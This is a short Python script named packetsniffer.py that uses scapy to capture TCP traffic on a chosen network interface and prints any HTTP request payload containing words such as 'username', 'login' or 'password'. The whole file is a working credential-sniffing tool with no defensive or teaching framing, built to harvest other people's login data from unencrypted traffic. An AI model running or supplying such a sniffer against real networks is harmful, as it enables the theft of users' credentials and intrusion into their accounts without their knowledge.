from scapy import all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff")
    options = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify an interface. Use --help for more information.")
    return options
    
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp")

def get_login(packet):
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords  = ["username", "user", "login", "password", "nip", "etc.."]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        login_info = get_login(packet)
        if login_info:
            print("[+] Get Information")
            print(login_info)
            print("\n")

print("--------------------------------------------------")
print("|\t packetsniffer.py - keode by relofa\t |")
print("--------------------------------------------------")

try:        
    options = get_arguments()
    print("[+] Sniffing...\n")
    sniff(options.interface)

except KeyboardInterrupt:
    print("[-] Exit packetsniffer.py - keode by relofa")

except :
    print("[-] Exit packetsniffer.py - keode by relofa")
